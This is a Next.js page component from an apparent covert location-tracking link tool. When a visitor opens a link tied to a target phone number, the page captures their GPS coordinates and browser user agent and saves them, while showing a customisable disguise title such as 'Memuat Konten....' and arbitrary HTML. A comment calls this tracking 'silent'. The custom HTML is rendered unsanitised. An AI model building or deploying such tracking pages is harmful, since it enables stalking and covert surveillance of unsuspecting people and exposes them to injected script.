"use client"

import { useEffect, useState } from "react"
import { useParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { saveLocationData, getTrackingLinkById } from "@/lib/actions"
import { Loader2, Tag } from "lucide-react"
import { StaticMap } from "@/components/static-map"
import { Footer } from "@/components/footer"

interface TrackingLink {
  id: string
  phone_number: string
  created_by: string
  created_at: string
  custom_title?: string
  custom_description?: string
  custom_content?: string
}

export default function TrackPage() {
  const params = useParams()
  const trackingId = params.id as string

  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [locationSaved, setLocationSaved] = useState(false)
  const [coordinates, setCoordinates] = useState<{ lat: number; lng: number } | null>(null)
  const [browserInfo, setBrowserInfo] = useState<string>("")
  const [trackingLink, setTrackingLink] = useState<TrackingLink | null>(null)
  const [trackingComplete, setTrackingComplete] = useState(false)

  // Fetch tracking link details
  useEffect(() => {
    const fetchTrackingLink = async () => {
      try {
        const link = await getTrackingLinkById(trackingId)
        if (link) {
          setTrackingLink(link)

          // Set document title based on custom title if available
          if (link.custom_title) {
            document.title = link.custom_title
          }
        }
      } catch (error) {
        console.error("Error fetching tracking link:", error)
      }
    }

    fetchTrackingLink()
  }, [trackingId])

  // Handle location tracking silently in the background
  useEffect(() => {
    // Get browser information
    const browser = navigator.userAgent
    setBrowserInfo(browser)

    // Request location permission and get coordinates
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords
          setCoordinates({ lat: latitude, lng: longitude })

          try {
            // Save the location data using just the tracking ID
            await saveLocationData(trackingId, latitude, longitude, browser)
            setLocationSaved(true)
            // Set tracking as complete after a short delay
            setTimeout(() => {
              setTrackingComplete(true)
              setIsLoading(false)
            }, 500)
          } catch (err) {
            console.error("Error saving location:", err)
            setError("Failed to save location data")
            setIsLoading(false)
          }
        },
        (err) => {
          console.error("Geolocation error:", err)
          setError("Location permission denied. Please allow location access.")
          setIsLoading(false)
        },
      )
    } else {
      setError("Geolocation is not supported by this browser")
      setIsLoading(false)
    }
  }, [trackingId])

  // Default content if no custom content is provided
  const defaultContent = (
    <div className="text-center py-4">
      <p className="text-lg font-medium mb-2">Thank you!</p>
      <p className="text-muted-foreground">Your location has been successfully recorded.</p>
    </div>
  )

  // Set the page title and description
  const pageTitle = trackingLink?.custom_title || "Memuat Konten...."
  const pageDescription = trackingLink?.custom_description || ""

  return (
    <>
      <div className="min-h-screen flex flex-col">
        <main className="container mx-auto py-10 px-4 flex items-center justify-center flex-grow">
          <Card className="max-w-md w-full">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Tag className="h-5 w-5 text-primary" />
                {pageTitle}
              </CardTitle>
              {pageDescription && <CardDescription>{pageDescription}</CardDescription>}
            </CardHeader>
            <CardContent>
              {isLoading ? (
                <div className="flex flex-col items-center justify-center py-12">
                  <Loader2 className="h-12 w-12 animate-spin text-primary" />
                </div>
              ) : error ? (
                <div className="text-center py-4">
                  <p className="text-destructive">{error}</p>
                  <Button className="mt-4" onClick={() => window.location.reload()}>
                    Try Again
                  </Button>
                </div>
              ) : (
                <>
                  {/* Display custom content if available */}
                  {trackingLink?.custom_content ? (
                    <div
                      className="prose prose-sm max-w-none"
                      dangerouslySetInnerHTML={{ __html: trackingLink.custom_content }}
                    />
                  ) : (
                    defaultContent
                  )}

                  {/* Only show map if tracking is complete and no custom content */}
                  {trackingComplete && coordinates && !trackingLink?.custom_content && (
                    <div className="mt-4">
                      <StaticMap
                        coordinates={[{ lat: coordinates.lat, lng: coordinates.lng }]}
                        height="h-[250px]"
                        zoom={17}
                      />
                    </div>
                  )}
                </>
              )}
            </CardContent>
            {!isLoading && (
              <CardFooter>
                <Button className="w-full" variant="outline" onClick={() => window.close()}>
                  Close This Page
                </Button>
              </CardFooter>
            )}
          </Card>
        </main>
        <Footer />
      </div>
    </>
  )
}
